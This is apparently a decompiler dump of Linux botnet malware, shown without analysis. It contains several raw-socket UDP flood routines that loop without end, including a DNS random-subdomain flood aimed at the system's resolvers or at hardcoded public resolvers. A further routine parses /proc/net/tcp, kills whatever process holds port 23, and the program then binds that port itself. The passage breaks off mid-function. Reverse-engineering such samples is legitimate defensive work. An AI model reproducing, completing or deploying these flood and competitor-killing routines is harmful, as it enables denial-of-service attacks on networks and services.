  uVar5 = FUN_0804a420(param_3,param_4,0,0x200);
  cVar2 = FUN_0804a420(param_3,param_4,1,1);
  local_20 = 0;
  local_1c = 0;
  local_18 = 0;
  local_14 = 0;
  if (sVar4 == -1) {
    uVar6 = FUN_0804f450();
  }
  else {
    uVar6 = FUN_08052544(sVar4);
  }
  uVar10 = (uint)param_1;
  if (param_1 != 0) {
    local_28 = 1;
    uVar12 = uVar10;
    do {
      uVar13 = FUN_08051070(0xffff,1,uVar12,uVar12);
      *(undefined4 *)(iVar8 + -4 + local_28 * 4) = uVar13;
      if (sVar3 == -1) {
        uVar7 = FUN_0804f450();
        *(undefined2 *)(param_2 + 2) = uVar7;
        uVar13 = extraout_ECX_00;
      }
      else {
        uVar7 = FUN_08052544(sVar3);
        *(undefined2 *)(param_2 + 2) = uVar7;
        uVar13 = extraout_ECX;
      }
      iVar11 = FUN_08052834(2,2,0x11,uVar13);
      *(int *)(iVar9 + -4 + local_28 * 4) = iVar11;
      if (iVar11 == -1) {
        return;
      }
      local_20 = CONCAT22(uVar6,2);
      local_1c = 0;
      uVar13 = FUN_080523c4(iVar11,&local_20,0x10,CONCAT22((short)(local_28 >> 0x10),uVar6));
      if (*(byte *)(param_2 + 0x14) < 0x20) {
        iVar11 = FUN_080526b8(*(undefined4 *)(param_2 + 0x10));
        uVar12 = FUN_0804f450();
        uVar13 = FUN_08052518((uVar12 >> (*(byte *)(param_2 + 0x14) & 0x1f)) + iVar11);
        *(undefined4 *)(param_2 + 4) = uVar13;
      }
      FUN_08052418(*(undefined4 *)(iVar9 + -4 + local_28 * 4),param_2,0x10,uVar13);
      local_28 = local_28 + 1;
      uVar12 = uVar14 + 1;
      param_2 = param_2 + 0x18;
    } while (local_28 != uVar12);
  }
  if (cVar2 == '\0') {
    iVar11 = 0;
    do {
      while ((int)uVar10 <= iVar11) {
        iVar11 = 0;
      }
      iVar1 = iVar11 * 4;
      iVar11 = iVar11 + 1;
      FUN_08052768(*(undefined4 *)(iVar1 + iVar9),*(undefined4 *)(iVar1 + iVar8),uVar5,0x4000);
    } while( true );
  }
  local_34 = 0;
  do {
    for (; local_34 < (int)uVar10; local_34 = local_34 + 1) {
      uVar13 = *(undefined4 *)(local_34 * 4 + iVar8);
      FUN_0804f5e0(uVar13,uVar5,uVar10,uVar10);
      FUN_08052768(*(undefined4 *)(local_34 * 4 + iVar9),uVar13,uVar5,0x4000);
    }
    local_34 = 0;
  } while( true );
}



void FUN_0804c890(byte param_1,int param_2,undefined param_3,undefined4 param_4)

{
  undefined *puVar1;
  int iVar2;
  undefined uVar3;
  undefined uVar4;
  char cVar5;
  char cVar6;
  short sVar7;
  short sVar8;
  short sVar9;
  ushort uVar10;
  undefined2 uVar11;
  uint uVar12;
  int iVar13;
  int iVar14;
  int iVar15;
  int iVar16;
  uint uVar17;
  undefined4 uVar18;
  uint uVar19;
  int local_14;
  
  uVar12 = (uint)param_1;
  iVar13 = FUN_08051070(uVar12,4);
  uVar3 = FUN_0804a420(param_3,param_4,2,0);
  sVar7 = FUN_0804a420(param_3,param_4,3,0xffff);
  uVar4 = FUN_0804a420(param_3,param_4,4,0x40);
  cVar5 = FUN_0804a420(param_3,param_4,5,0);
  sVar8 = FUN_0804a420(param_3,param_4,6,0xffff);
  sVar9 = FUN_0804a420(param_3,param_4,7,0xffff);
  uVar10 = FUN_0804a420(param_3,param_4,0,0x200);
  cVar6 = FUN_0804a420(param_3,param_4,1,1);
  iVar14 = FUN_0804a420(param_3,param_4,0x19,DAT_0805569c);
  iVar15 = FUN_08052834(2,3,0x11);
  if (iVar15 != -1) {
    local_14 = 1;
    iVar16 = FUN_080527e0(iVar15,0,3,&local_14,4);
    if (iVar16 != -1) {
      if (0x5b4 < uVar10) {
        uVar10 = 0x5b4;
      }
      local_14 = 0;
      if (param_1 != 0) {
        uVar17 = (uint)(ushort)(uVar10 + 8);
        do {
          iVar16 = local_14;
          uVar18 = FUN_08051070(0x5e6,1,uVar17,uVar17);
          *(undefined4 *)(iVar13 + iVar16 * 4) = uVar18;
          puVar1 = *(undefined **)(iVar13 + local_14 * 4);
          *puVar1 = 0x45;
          puVar1[1] = uVar3;
          uVar11 = FUN_08052544(uVar10 + 0x1c);
          *(undefined2 *)(puVar1 + 2) = uVar11;
          uVar11 = FUN_08052544(sVar7);
          *(undefined2 *)(puVar1 + 4) = uVar11;
          puVar1[8] = uVar4;
          if (cVar5 != '\0') {
            uVar11 = FUN_08052544(0x4000);
            *(undefined2 *)(puVar1 + 6) = uVar11;
          }
          puVar1[9] = 0x11;
          *(int *)(puVar1 + 0xc) = iVar14;
          *(undefined4 *)(puVar1 + 0x10) = *(undefined4 *)(param_2 + 0x10 + local_14 * 0x18);
          uVar11 = FUN_08052544(sVar8);
          *(undefined2 *)(puVar1 + 0x14) = uVar11;
          uVar11 = FUN_08052544(sVar9);
          *(undefined2 *)(puVar1 + 0x16) = uVar11;
          uVar17 = FUN_08052544((uint)(ushort)(uVar10 + 8));
          local_14 = local_14 + 1;
          *(short *)(puVar1 + 0x18) = (short)uVar17;
        } while (local_14 < (int)uVar12);
      }
      uVar17 = (uint)uVar10;
      do {
        do {
          local_14 = 0;
        } while (param_1 == 0);
        do {
          iVar2 = *(int *)(iVar13 + local_14 * 4);
          iVar16 = param_2 + local_14 * 0x18;
          if (*(byte *)(iVar16 + 0x14) < 0x20) {
            iVar16 = FUN_080526b8(*(undefined4 *)(iVar16 + 0x10));
            uVar19 = FUN_0804f450();
            iVar16 = FUN_08052518((uVar19 >> (*(byte *)(param_2 + 0x14 + local_14 * 0x18) & 0x1f)) +
                                  iVar16);
            *(int *)(iVar2 + 0x10) = iVar16;
          }
          if (iVar14 == -1) {
            iVar16 = FUN_0804f450();
            *(int *)(iVar2 + 0xc) = iVar16;
          }
          if (sVar7 == -1) {
            iVar16 = FUN_0804f450();
            *(short *)(iVar2 + 4) = (short)iVar16;
          }
          if (sVar8 == -1) {
            iVar16 = FUN_0804f450();
            *(short *)(iVar2 + 0x14) = (short)iVar16;
          }
          if (sVar9 == -1) {
            iVar16 = FUN_0804f450();
            *(short *)(iVar2 + 0x16) = (short)iVar16;
          }
          if (cVar6 != '\0') {
            iVar16 = FUN_0804f5e0(iVar2 + 0x1c,uVar17,iVar16,iVar16);
          }
          *(undefined2 *)(iVar2 + 10) = 0;
          uVar11 = FUN_0804d7a0(iVar2,0x14,iVar16,iVar16);
          *(undefined2 *)(iVar2 + 10) = uVar11;
          *(undefined2 *)(iVar2 + 0x1a) = 0;
          uVar11 = FUN_0804d7f0(iVar2,iVar2 + 0x14,*(undefined2 *)(iVar2 + 0x18),uVar17 + 8);
          *(undefined2 *)(iVar2 + 0x1a) = uVar11;
          iVar16 = param_2 + local_14 * 0x18;
          *(undefined2 *)(iVar16 + 2) = *(undefined2 *)(iVar2 + 0x16);
          FUN_08052788(iVar15,iVar2,uVar17 + 0x1c,0x4000,iVar16,0x10);
          local_14 = local_14 + 1;
        } while (local_14 < (int)uVar12);
      } while( true );
    }
    FUN_08053125(iVar15);
  }
  return;
}



// WARNING: Removing unreachable block (ram,0x0804d00f)

void FUN_0804cce0(byte param_1,int param_2,undefined param_3,undefined4 param_4)

{
  undefined *puVar1;
  int iVar2;
  undefined uVar3;
  undefined uVar4;
  char cVar5;
  short sVar6;
  ushort uVar7;
  short sVar8;
  undefined2 uVar9;
  uint uVar10;
  int iVar11;
  undefined4 uVar12;
  int iVar13;
  int iVar14;
  uint uVar15;
  undefined4 uVar16;
  int local_18;
  int local_14;
  
  uVar10 = (uint)param_1;
  iVar11 = FUN_08051070(uVar10,4);
  uVar3 = FUN_0804a420(param_3,param_4,2,0);
  sVar6 = FUN_0804a420(param_3,param_4,3,0xffff);
  uVar4 = FUN_0804a420(param_3,param_4,4,0x40);
  cVar5 = FUN_0804a420(param_3,param_4,5,0);
  uVar7 = FUN_0804a420(param_3,param_4,6,0xffff);
  sVar8 = FUN_0804a420(param_3,param_4,7,0x6987);
  FUN_0804fcd0(0x1d);
  uVar12 = FUN_0804fc20(0x1d,&local_18);
  iVar13 = FUN_08052834(2,3,0x11);
  if (iVar13 != -1) {
    local_14 = 1;
    iVar14 = FUN_080527e0(iVar13,0,3,&local_14,4);
    if (iVar14 != -1) {
      local_14 = 0;
      if (param_1 != 0) {
        uVar15 = (uint)uVar7;
        do {
          iVar14 = local_14;
          uVar16 = FUN_08051070(0x80,1,uVar15,uVar15);
          *(undefined4 *)(iVar11 + iVar14 * 4) = uVar16;
          puVar1 = *(undefined **)(iVar11 + local_14 * 4);
          *puVar1 = 0x45;
          puVar1[1] = uVar3;
          uVar9 = FUN_08052544(local_18 + 0x20U & 0xffff);
          *(undefined2 *)(puVar1 + 2) = uVar9;
          uVar9 = FUN_08052544(sVar6);
          *(undefined2 *)(puVar1 + 4) = uVar9;
          puVar1[8] = uVar4;
          if (cVar5 != '\0') {
            uVar9 = FUN_08052544(0x4000);
            *(undefined2 *)(puVar1 + 6) = uVar9;
          }
          puVar1[9] = 0x11;
          *(undefined4 *)(puVar1 + 0xc) = DAT_0805569c;
          *(undefined4 *)(puVar1 + 0x10) = *(undefined4 *)(param_2 + 0x10 + local_14 * 0x18);
          uVar9 = FUN_08052544((uint)uVar7);
          *(undefined2 *)(puVar1 + 0x14) = uVar9;
          uVar9 = FUN_08052544(sVar8);
          *(undefined2 *)(puVar1 + 0x16) = uVar9;
          uVar9 = FUN_08052544(local_18 + 0xcU & 0xffff);
          *(undefined4 *)(puVar1 + 0x1c) = 0xffffffff;
          *(undefined2 *)(puVar1 + 0x18) = uVar9;
          uVar15 = FUN_08050680(puVar1 + 0x20,uVar12,local_18);
          local_14 = local_14 + 1;
        } while (local_14 < (int)uVar10);
      }
      do {
        do {
        } while (param_1 == 0);
        local_14 = 0;
        do {
          iVar2 = *(int *)(iVar11 + local_14 * 4);
          iVar14 = param_2 + local_14 * 0x18;
          if (*(byte *)(iVar14 + 0x14) < 0x20) {
            iVar14 = FUN_080526b8(*(undefined4 *)(iVar14 + 0x10));
            uVar15 = FUN_0804f450();
            iVar14 = FUN_08052518((uVar15 >> (*(byte *)(param_2 + 0x14 + local_14 * 0x18) & 0x1f)) +
                                  iVar14);
            *(int *)(iVar2 + 0x10) = iVar14;
          }
          if (sVar6 == -1) {
            iVar14 = FUN_0804f450();
            *(short *)(iVar2 + 4) = (short)iVar14;
          }
          if (uVar7 == 0xffff) {
            iVar14 = FUN_0804f450();
            *(short *)(iVar2 + 0x14) = (short)iVar14;
          }
          if (sVar8 == -1) {
            iVar14 = FUN_0804f450();
            *(short *)(iVar2 + 0x16) = (short)iVar14;
          }
          *(undefined2 *)(iVar2 + 10) = 0;
          uVar9 = FUN_0804d7a0(iVar2,0x14,iVar14,iVar14);
          *(undefined2 *)(iVar2 + 10) = uVar9;
          *(undefined2 *)(iVar2 + 0x1a) = 0;
          uVar9 = FUN_0804d7f0(iVar2,iVar2 + 0x14,*(undefined2 *)(iVar2 + 0x18),local_18 + 0xc);
          *(undefined2 *)(iVar2 + 0x1a) = uVar9;
          iVar14 = param_2 + local_14 * 0x18;
          *(undefined2 *)(iVar14 + 2) = *(undefined2 *)(iVar2 + 0x16);
          FUN_08052788(iVar13,iVar2,local_18 + 0x20,0x4000,iVar14,0x10);
          local_14 = local_14 + 1;
        } while (local_14 < (int)uVar10);
      } while( true );
    }
    FUN_08053125(iVar13);
  }
  return;
}



void FUN_0804d0b0(byte param_1,int param_2,undefined param_3,undefined4 param_4)

{
  char *pcVar1;
  undefined *puVar2;
  bool bVar3;
  undefined uVar4;
  undefined uVar5;
  char cVar6;
  byte bVar7;
  byte bVar8;
  short sVar9;
  short sVar10;
  short sVar11;
  short sVar12;
  undefined2 uVar13;
  int iVar14;
  int iVar15;
  undefined4 uVar16;
  int iVar17;
  int iVar18;
  int iVar19;
  int iVar20;
  uint uVar21;
  char cVar22;
  undefined4 extraout_ECX;
  byte *pbVar23;
  char *pcVar24;
  uint extraout_EDX;
  uint uVar25;
  undefined4 local_88c;
  byte local_834 [2048];
  undefined local_34 [32];
  int local_14;
  
  uVar25 = (uint)param_1;
  iVar14 = FUN_08051070(uVar25,4);
  uVar4 = FUN_0804a420(param_3,param_4,2,0);
  sVar9 = FUN_0804a420(param_3,param_4,3,0xffff);
  uVar5 = FUN_0804a420(param_3,param_4,4,0x40);
  cVar6 = FUN_0804a420(param_3,param_4,5,0);
  sVar10 = FUN_0804a420(param_3,param_4,6,0xffff);
  sVar11 = FUN_0804a420(param_3,param_4,7,0x35);
  sVar12 = FUN_0804a420(param_3,param_4,9,0xffff);
  bVar7 = FUN_0804a420(param_3,param_4,0,0xc);
  iVar15 = FUN_08049ef0(param_3,param_4,8,0);
  FUN_0804fcd0(0x1e);
  uVar16 = FUN_0804fc20(0x1e,0);
  iVar17 = FUN_08050ef8(uVar16,0);
  FUN_0804fc50(0x1e);
  if (-1 < iVar17) {
    iVar18 = FUN_08053178(iVar17,local_834,0x800,extraout_ECX);
    FUN_08053125(iVar17);
    FUN_0804fcd0(0x1f);
    uVar16 = FUN_0804fc20(0x1f,0);
    iVar17 = FUN_08050900(local_834,iVar18,uVar16);
    FUN_0804fc50(0x1f);
    if ((iVar17 != -1) && (iVar17 < iVar18)) {
      pbVar23 = local_834 + iVar17;
      bVar3 = false;
      iVar19 = iVar17;
      do {
        bVar8 = *pbVar23;
        if (bVar3) {
LAB_0804d258:
          if (((bVar8 != 0x2e) && (bVar8 = bVar8 - 0x30, 9 < bVar8)) || (iVar18 + -1 == iVar19)) {
            FUN_08050680(local_34,local_834 + iVar17,iVar19 - iVar17,bVar8);
            local_34[iVar19 - iVar17] = 0;
            local_88c = FUN_08052550(local_34);
            goto LAB_0804d29f;
          }
        }
        else if ((bVar8 != 0x20) && (bVar8 != 9)) {
          bVar3 = true;
          goto LAB_0804d258;
        }
        iVar19 = iVar19 + 1;
        pbVar23 = pbVar23 + 1;
      } while (iVar19 != iVar18);
    }
  }
  uVar21 = FUN_0804f450();
  uVar21 = uVar21 & 3;
  if (uVar21 == 1) {
    local_88c = FUN_08052518(0x4a522a2a);
  }
  else if (uVar21 == 0) {
    local_88c = FUN_08052518(0x8080808);
  }
  else if (uVar21 == 2) {
    local_88c = FUN_08052518(0x40064006);
  }
  else if (uVar21 == 3) {
    local_88c = FUN_08052518(0x4020202);
  }
LAB_0804d29f:
  if (iVar15 != 0) {
    iVar17 = FUN_08050620(iVar15);
    iVar18 = FUN_08052834(2,3,0x11);
    if (iVar18 != -1) {
      local_14 = 1;
      iVar19 = FUN_080527e0(iVar18,0,3,&local_14,4);
      if (iVar19 != -1) {
        local_14 = 0;
        if (param_1 != 0) {
          iVar19 = iVar17 + 1;
          uVar21 = (uint)bVar7;
          do {
            iVar20 = local_14;
            uVar16 = FUN_08051070(600,1,uVar21,uVar21);
            *(undefined4 *)(iVar14 + iVar20 * 4) = uVar16;
            puVar2 = *(undefined **)(iVar14 + local_14 * 4);
            *puVar2 = 0x45;
            puVar2[1] = uVar4;
            uVar13 = FUN_08052544((uint)bVar7 + iVar17 + 0x2f & 0xffff);
            *(undefined2 *)(puVar2 + 2) = uVar13;
            uVar13 = FUN_08052544(sVar9);
            puVar2[8] = uVar5;
            *(undefined2 *)(puVar2 + 4) = uVar13;
            if (cVar6 != '\0') {
              uVar13 = FUN_08052544(0x4000);
              *(undefined2 *)(puVar2 + 6) = uVar13;
            }
            puVar2[9] = 0x11;
            *(undefined4 *)(puVar2 + 0xc) = DAT_0805569c;
            *(undefined4 *)(puVar2 + 0x10) = local_88c;
            uVar13 = FUN_08052544(sVar10);
            *(undefined2 *)(puVar2 + 0x14) = uVar13;
            uVar13 = FUN_08052544(sVar11);
            *(undefined2 *)(puVar2 + 0x16) = uVar13;
            uVar13 = FUN_08052544((uint)bVar7 + iVar17 + 0x1b & 0xffff);
            *(undefined2 *)(puVar2 + 0x18) = uVar13;
            uVar13 = FUN_08052544(sVar12);
            *(undefined2 *)(puVar2 + 0x1c) = uVar13;
            uVar13 = FUN_08052544(0x100);
            *(undefined2 *)(puVar2 + 0x1e) = uVar13;
            uVar13 = FUN_08052544(1);
            *(undefined2 *)(puVar2 + 0x20) = uVar13;
            puVar2[0x28] = bVar7;
            pcVar1 = puVar2 + bVar7 + 0x29;
            FUN_08050680(pcVar1 + 1,iVar15,iVar19);
            pcVar24 = pcVar1;
            if (iVar17 < 1) {
              cVar22 = '\0';
            }
            else {
              cVar22 = '\0';
              iVar20 = 1;
              do {
                while (*(char *)(iVar20 + -1 + iVar15) == '.') {
                  *pcVar24 = cVar22;
                  pcVar24 = pcVar1 + iVar20;
                  iVar20 = iVar20 + 1;
                  cVar22 = '\0';
                  if (iVar20 == iVar19) goto LAB_0804d511;
                }
                iVar20 = iVar20 + 1;
                cVar22 = cVar22 + '\x01';
              } while (iVar20 != iVar19);
            }
LAB_0804d511:
            *pcVar24 = cVar22;
            uVar13 = FUN_08052544(1);
            *(undefined2 *)(pcVar1 + iVar17 + 2) = uVar13;
            uVar13 = FUN_08052544(1);
            *(undefined2 *)(pcVar1 + iVar17 + 4) = uVar13;
            local_14 = local_14 + 1;
            uVar21 = extraout_EDX;
          } while (local_14 < (int)uVar25);
        }
        iVar17 = iVar17 + (uint)bVar7;
        do {
          do {
            local_14 = 0;
          } while (param_1 == 0);
          do {
            iVar15 = *(int *)(iVar14 + local_14 * 4);
            iVar19 = local_14;
            if (sVar9 == -1) {
              iVar19 = FUN_0804f450();
              *(short *)(iVar15 + 4) = (short)iVar19;
            }
            if (sVar10 == -1) {
              iVar19 = FUN_0804f450();
              *(short *)(iVar15 + 0x14) = (short)iVar19;
            }
            if (sVar11 == -1) {
              iVar19 = FUN_0804f450();
              *(short *)(iVar15 + 0x16) = (short)iVar19;
            }
            if (sVar12 == -1) {
              iVar19 = FUN_0804f450();
              *(short *)(iVar15 + 0x1c) = (short)iVar19;
            }
            FUN_0804f4d0(iVar15 + 0x29,(uint)bVar7,iVar19,iVar19);
            *(undefined2 *)(iVar15 + 10) = 0;
            uVar13 = FUN_0804d7a0(iVar15,0x14);
            *(undefined2 *)(iVar15 + 10) = uVar13;
            *(undefined2 *)(iVar15 + 0x1a) = 0;
            uVar13 = FUN_0804d7f0(iVar15,iVar15 + 0x14,*(undefined2 *)(iVar15 + 0x18),iVar17 + 0x1b)
            ;
            *(undefined2 *)(iVar15 + 0x1a) = uVar13;
            iVar19 = param_2 + local_14 * 0x18;
            *(undefined4 *)(iVar19 + 4) = local_88c;
            *(undefined2 *)(iVar19 + 2) = *(undefined2 *)(iVar15 + 0x16);
            FUN_08052788(iVar18,iVar15,iVar17 + 0x2f,0x4000,iVar19,0x10);
            local_14 = local_14 + 1;
          } while (local_14 < (int)uVar25);
        } while( true );
      }
      FUN_08053125(iVar18);
    }
  }
  return;
}



uint FUN_0804d7a0(ushort *param_1,uint param_2)

{
  ushort uVar1;
  uint uVar2;
  
  uVar2 = 0;
  if (1 < param_2) {
    do {
      uVar1 = *param_1;
      param_2 = param_2 - 2;
      param_1 = param_1 + 1;
      uVar2 = uVar2 + uVar1;
    } while (1 < param_2);
  }
  if (param_2 == 1) {
    uVar2 = uVar2 + (int)*(char *)param_1;
  }
  uVar2 = (uVar2 & 0xffff) + (uVar2 >> 0x10);
  return ((uVar2 >> 0x10) + uVar2 ^ 0xffffffff) & 0xffff;
}



uint FUN_0804d7f0(int param_1,ushort *param_2,uint param_3,int param_4)

{
  ushort uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  
  iVar5 = 0;
  uVar4 = *(uint *)(param_1 + 0xc);
  uVar2 = *(uint *)(param_1 + 0x10);
  if (1 < param_4) {
    do {
      uVar1 = *param_2;
      param_4 = param_4 + -2;
      param_2 = param_2 + 1;
      iVar5 = iVar5 + (uint)uVar1;
    } while (1 < param_4);
  }
  if (param_4 == 1) {
    iVar5 = iVar5 + (uint)*(byte *)param_2;
  }
  uVar3 = FUN_08052544(*(undefined *)(param_1 + 9));
  for (uVar4 = (uVar2 & 0xffff) + (uVar4 & 0xffff) + (uVar4 >> 0x10) + (uVar2 >> 0x10) +
               (param_3 & 0xffff) + iVar5 + (uVar3 & 0xffff); uVar4 >> 0x10 != 0;
      uVar4 = (uVar4 & 0xffff) + (uVar4 >> 0x10)) {
  }
  return (uVar4 ^ 0xffffffff) & 0xffff;
}



void FUN_0804d8b0(void)

{
  FUN_08052a70(DAT_08055698,9);
  return;
}



bool FUN_0804d8d0(undefined2 param_1)

{
  byte *pbVar1;
  byte bVar2;
  bool bVar3;
  undefined2 uVar4;
  int iVar5;
  uint uVar6;
  byte *pbVar7;
  undefined4 uVar8;
  uint uVar9;
  int iVar10;
  int iVar11;
  bool bVar12;
  int iVar13;
  int iVar14;
  undefined *puVar15;
  undefined local_2231 [4096];
  undefined local_1231 [4096];
  byte local_231 [513];
  undefined local_30;
  undefined local_2f;
  undefined local_2c;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  
  FUN_08052dbc(local_1231,0,0x1000);
  FUN_08052dbc(local_2231,0,0x1000);
  FUN_08052dbc(local_231,0,0x201);
  local_20 = 0;
  local_1c = 0;
  local_18 = 0;
  local_14 = 0;
  uVar4 = FUN_080526e4(param_1);
  FUN_08050a20(uVar4,0x10,&local_30);
  iVar5 = FUN_08050620(&local_30);
  if (iVar5 == 2) {
    local_2c = 0;
    local_30 = 0x30;
    local_2f = 0x30;
  }
  FUN_0804fcd0(6);
  FUN_0804fcd0(7);
  FUN_0804fcd0(9);
  uVar6 = FUN_08050ef8("/proc/net/tcp",0);
  uVar9 = uVar6;
  if (uVar6 != 0xffffffff) {
LAB_0804d9d0:
    do {
      do {
        do {
          do {
            iVar5 = FUN_08050820(local_231,0x200,uVar6,uVar9);
            if (iVar5 == 0) goto LAB_0804db07;
            uVar9 = (uint)local_231[0];
            if ((local_231[0] == 0) || (local_231[0] == 0x3a)) {
              iVar5 = 0;
            }
            else {
              iVar5 = 0;
              do {
                iVar5 = iVar5 + 1;
                bVar2 = local_231[iVar5];
                uVar9 = (uint)bVar2;
                if (bVar2 == 0) goto LAB_0804d9d0;
              } while (bVar2 != 0x3a);
            }
          } while ((char)uVar9 == '\0');
          iVar14 = iVar5 + 2;
          iVar13 = iVar14;
          if ((local_231[iVar5 + 2] != 0) && (local_231[iVar5 + 2] != 0x20)) {
            pbVar7 = local_231 + iVar5;
            do {
              pbVar1 = pbVar7 + 3;
              iVar13 = iVar13 + 1;
              pbVar7 = pbVar7 + 1;
              if (*pbVar1 == 0) break;
            } while (*pbVar1 != 0x20);
          }
          local_231[iVar13] = 0;
          pbVar7 = local_231 + iVar14;
          uVar8 = FUN_08050620(pbVar7);
          iVar5 = FUN_08050900(pbVar7,uVar8,&local_30);
          uVar9 = iVar5 + 1U;
        } while (iVar5 + 1U == 0);
        pbVar7 = local_231 + iVar13;
        bVar3 = false;
        iVar14 = 0;
        bVar12 = false;
        iVar5 = iVar13 + 1;
LAB_0804da80:
        do {
          iVar13 = iVar5;
          bVar2 = pbVar7[2];
          iVar5 = iVar13 + 1;
          if (bVar2 == 0) break;
          if ((bVar2 == 0x20) || (bVar2 == 9)) {
            bVar3 = true;
          }
          else {
            if ((bVar3) && (iVar14 = iVar14 + 1, iVar14 == 1)) {
              if (pbVar7[3] == 0x41) {
                bVar12 = true;
              }
              pbVar7 = pbVar7 + 1;
              bVar3 = false;
              goto LAB_0804da80;
            }
            bVar3 = false;
          }
          pbVar7 = pbVar7 + 1;
        } while (iVar14 < 7);
        uVar9 = (uint)bVar2;
      } while (!bVar12);
      iVar14 = iVar5;
      if ((local_231[iVar13 + 1] != 0) && (local_231[iVar13 + 1] != 0x20)) {
        pbVar7 = local_231 + iVar5;
        do {
          pbVar1 = pbVar7 + 1;
          iVar14 = iVar14 + 1;
          pbVar7 = pbVar7 + 1;
          if (*pbVar1 == 0) break;
        } while (*pbVar1 != 0x20);
      }
      local_231[iVar14] = 0;
      pbVar7 = local_231 + iVar5;
      uVar9 = FUN_08050620(pbVar7);
    } while (0xf < (int)uVar9);
    FUN_08050640(&local_20,pbVar7,uVar9,uVar9);
LAB_0804db07:
    FUN_08053125(uVar6);
    iVar5 = FUN_08050620(&local_20);
    if (iVar5 != 0) {
      uVar8 = FUN_0804fc20(6,0,iVar5,iVar5);
      iVar5 = FUN_08050b08(uVar8);
      bVar3 = false;
      bVar12 = false;
      if (iVar5 != 0) {
        while ((iVar14 = FUN_08050b50(iVar5), iVar14 != 0 && (!bVar3))) {
          iVar13 = CONCAT31((int3)((uint)iVar14 >> 8),*(undefined *)(iVar14 + 0x13)) + -0x30;
          if ((byte)iVar13 < 10) {
            iVar14 = iVar14 + 0x13;
            uVar8 = FUN_0804fc20(6,0,iVar13,iVar13);
            FUN_08050640(local_1231,uVar8);
            iVar13 = FUN_08050620(local_1231);
            FUN_08050640(local_1231 + iVar13,iVar14);
            uVar8 = FUN_0804fc20(7,0);
            iVar13 = FUN_08050620(local_1231);
            FUN_08050640(local_1231 + iVar13,uVar8);
            iVar13 = FUN_080531a0(local_1231,local_2231,0x1000);
            iVar13 = iVar13 + 1;
            if (iVar13 != 0) {
              uVar8 = FUN_0804fc20(6,0,iVar13,iVar13);
              FUN_08050640(local_1231,uVar8);
              iVar13 = FUN_08050620(local_1231);
              FUN_08050640(local_1231 + iVar13,iVar14);
              uVar8 = FUN_0804fc20(9,0);
              iVar13 = FUN_08050620(local_1231);
              FUN_08050640(local_1231 + iVar13,uVar8);
              iVar13 = FUN_08050b08(local_1231);
              if (iVar13 != 0) {
                while ((iVar10 = FUN_08050b50(iVar13), iVar10 != 0 && (!bVar3))) {
                  FUN_080506b0(local_2231,0x1000,0,0);
                  uVar8 = FUN_0804fc20(6,0);
                  FUN_08050640(local_1231,uVar8);
                  iVar11 = FUN_08050620(local_1231);
                  FUN_08050640(local_1231 + iVar11,iVar14);
                  uVar8 = FUN_0804fc20(9,0);
                  iVar11 = FUN_08050620(local_1231);
                  FUN_08050640(local_1231 + iVar11,uVar8);
                  iVar11 = FUN_08050620(local_1231);
                  puVar15 = local_1231 + iVar11;
                  FUN_08050640(puVar15,&DAT_080546ad);
                  iVar11 = FUN_08050620(local_1231);
                  FUN_08050640(local_1231 + iVar11,iVar10 + 0x13);
                  iVar10 = FUN_080531a0(local_1231,local_2231,0x1000);
                  if (iVar10 != -1) {
                    uVar8 = FUN_08050620(local_2231);
                    iVar10 = FUN_08050900(local_2231,uVar8,&local_20);
                    if (iVar10 != -1) {
                      uVar8 = FUN_08050720(iVar14,10,puVar15,puVar15);
                      FUN_08052a70(uVar8,9);
                      bVar3 = true;
                    }
                  }
                }
                FUN_08050ae4(iVar13);
              }
            }
          }
        }
        FUN_08050ae4(iVar5);
        bVar12 = bVar3;
      }
      FUN_080531dc(1);
      FUN_0804fc50(6);
      FUN_0804fc50(7);
      FUN_0804fc50(9);
      return bVar12;
    }
    FUN_0804fc50(6);
    FUN_0804fc50(7);
    FUN_0804fc50(9);
  }
  return false;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0804df10(void)

{
  undefined2 uVar1;
  int iVar2;
  int iVar3;
  undefined4 uVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iVar11;
  uint uVar12;
  int iVar13;
  uint uVar14;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  byte *pbVar15;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  int iVar16;
  undefined *puVar17;
  int iVar18;
  uint uVar19;
  undefined *puVar20;
  uint local_20f0;
  byte local_20c4 [4096];
  undefined local_10c4 [4096];
  undefined local_c4 [64];
  undefined local_84 [64];
  undefined local_44 [16];
  undefined2 local_34;
  undefined2 local_32;
  undefined4 local_30;
  int local_24;
  uint local_20;
  int local_1c;
  int local_18;
  int local_14;
  
  iVar2 = FUN_080530dc(0);
  DAT_08055698 = FUN_08052955();
  if ((DAT_08055698 < 1) && (DAT_08055698 != -1)) {
    local_34 = 2;
    local_30 = 0;
    uVar1 = FUN_08052544(0x17);
    FUN_0804d8d0(uVar1);
    local_32 = FUN_08052544(0x17);
    iVar3 = FUN_08052834(2,1,0);
    if (iVar3 != -1) {
      FUN_080523c4(iVar3,&local_34,0x10,extraout_ECX);
      FUN_08052664(iVar3,1);
    }
    FUN_080531dc(5);
    DAT_08055694 = (undefined *)FUN_080519b0(0x1000);
    *DAT_08055694 = 0;
    _DAT_08055100 = 0;
    FUN_0804fcd0(6);
    FUN_0804fcd0(7);
    uVar4 = FUN_0804fc20(6,0);
    iVar3 = FUN_08050640(local_10c4,uVar4);
    puVar17 = local_10c4 + iVar3;
    uVar4 = FUN_08053160();
    uVar4 = FUN_08050a20(uVar4,10,local_44);
    puVar20 = puVar17;
    iVar3 = FUN_08050640(puVar17,uVar4);
    uVar4 = FUN_0804fc20(7,0);
    iVar5 = FUN_08050640(puVar17 + iVar3,uVar4);
    iVar6 = FUN_08050ef8(local_10c4,0);
    if (iVar6 != -1) {
      FUN_08053125(iVar6);
      FUN_0804fc50(6);
      FUN_0804fc50(7);
      iVar6 = FUN_080531a0(local_10c4,DAT_08055694,0xfff);
      if (iVar6 != -1) {
        DAT_08055694[iVar6] = 0;
      }
      iVar6 = 400;
      FUN_080506b0(local_10c4,puVar17 + iVar3 + (iVar5 - (int)local_10c4),puVar20,puVar20);
      local_20f0 = 0;
      while( true ) {
        FUN_0804fcd0(6);
        uVar4 = FUN_0804fc20(6,0);
        iVar3 = FUN_08050b08(uVar4);
        if (iVar3 == 0) break;
        FUN_0804fc50(6);
LAB_0804e130:
        iVar5 = FUN_08050b50(iVar3);
        if (iVar5 != 0) {
